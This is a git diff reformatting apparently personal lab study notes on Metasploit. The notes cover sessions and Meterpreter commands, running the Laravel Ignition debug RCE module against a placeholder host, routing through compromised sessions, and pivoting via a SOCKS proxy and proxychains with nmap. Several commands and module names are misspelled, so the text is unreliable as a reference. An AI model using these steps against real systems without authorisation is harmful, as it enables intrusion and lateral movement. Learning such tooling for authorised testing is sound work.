@@ -14,17 +14,20 @@
 * Often **Command Shells/Meterpreter** sessions which allow for executing commnads against the target
 * can also open up other session types, ie. **SSH / WinRm**
 * common console commands:
+#### View sessions
 ```
-# view sessions
 sessions
-
-# upgrade the last opened session to Meterpeter
+```
+#### Upgrade the last opened session to Meterpeter
+```
 sessions -u -1
-
-# interact with a session
+```
+#### Interact with a session
+```
 sessions -i [session_id]
-
-# background the currently interactive session and go back to the Metasploit prompt
+```
+#### Background the currently interactive session and go back to the Metasploit prompt
+```
 background
 ```
 ### What is a Meterpreter
@@ -32,20 +35,23 @@ background
   * can upload/download files or pivot utilizing a meterpreter session
   * Normal command shells do not suppoer complex operation such as pivoting
 * some useful commands in a meterpreter:
+
+#### Get information about the remote system, ie OS
 ```
-# get information about the remote system, ie OS
 sysinfo
-
-# Upload a file or directory
+```
+#### Upload a file or directory
+```
 upload local_file.txt
-
-# Display interfaces
+```
+#### Display interfaces
+```
 ipconfig
-
-# Resolve a set of host names on the targer to IP addresses
+```
+#### Resolve a set of host names on the targer to IP addresses
+```
 resovle remote_service1 remote_service2
 ```
-
 
 ## What is Pivoting?
 * once intial entry is gained, the compromised machine can be used to send additional web traffic to previously inaccessible machines
@@ -55,31 +61,38 @@ resovle remote_service1 remote_service2
 ## Using Metasploit
 * Metasploit can be started by running the commmand ```msfconsole``
 * comman commands:
+
+##### To search for a module, use the 'search' command
 ```
-# To search for a module, use the 'search' command
 msf6 > search laravel
-
-# Load a modile with the 'use; command:
+```
+#### Load a modile with the 'use; command:
+```
 msf6 > use mutli/php/ignition_laravel_debug_rce
-
-# View the information about the module, including the module options, description, CVE details, etc
-
+```
+#### View the information about the module, including the module options, description, CVE details, etc
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > info
-
-# View available options to set
+```
+#### View available options to set
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > show options
-
-# Set the target host and logging
+```
+#### Set the target host and logging
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set RHOST [MACHINE_IP]
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set verbose true
-
-# Set the payload listening addressl this is the IP address of the host running Metasploit
+```
+#### Set the payload listening addressl this is the IP address of the host running Metasploit
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > set LHOST [LITEN_IP]
-
-# Show options again with those that are set
+```
+#### Show options again with those that are set
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > show options
-
-# Run or check the module
+```
+#### Run or check the module
+```
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > check
 msf6 exploit(mutli/php/ignition_laravel_debug_rce) > run
 ```
@@ -89,17 +102,21 @@ msf6 exploit(mutli/php/ignition_laravel_debug_rce) > run
   * this routing table determines wehere to send network traffic through, this way we are using the Meterpreter to pivot
 * the top-level ```route``` command is not the same as the one used in a Meterpreter session, you will need to background this session before utilizing the top-level command
 * Usage:
+
+#### Example usage
 ```
-# Example usage
 msf6 > route [add/remove] subnet netmask ]comm/sid]
-
-# Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
+```
+#### Configure the routing table to send packets destined for 172.17.0.1 to the latest opened session
+```
 msf6 > route add 172.17.0.1/32 -1
-
-# Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
+```
+#### Configure the routing table to send packets destined for 172.28.101.48/29 subnet to the latest opened session
+```
 msf6 > route add 172.28.10.48/29 -1
-
-# Output the routing table
+```
+#### Output the routing table
+```
 msf6 > route print
 ```
 
@@ -111,11 +128,13 @@ msf6 > route print
 ```
 msf6 > auxiliary/server/socks_proxy
 msf6 > run SRVHOST=127.0.0.1 SRVPORT=9050 VERSION=4a
-
-# can send curl requests using the --proxy flag
+```
+#### Can send curl requests using the --proxy flag
+```
 msf6 > curl --proxy socks4a://127.0.0.1:9050 http://[MACHINE IP]
-
-# If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool's request to open a new network connection and route the request through a socks proxy 
+```
+#### If the tool does not natively support an option for using a socks proxy, ProxyChains can intercept the tool's request to open a new network connection and route the request through a socks proxy 
+```
 proxychains -q nmap -n -sT -Pn -p 22,80,443,5432 [MACHINE IP]
 ```
 
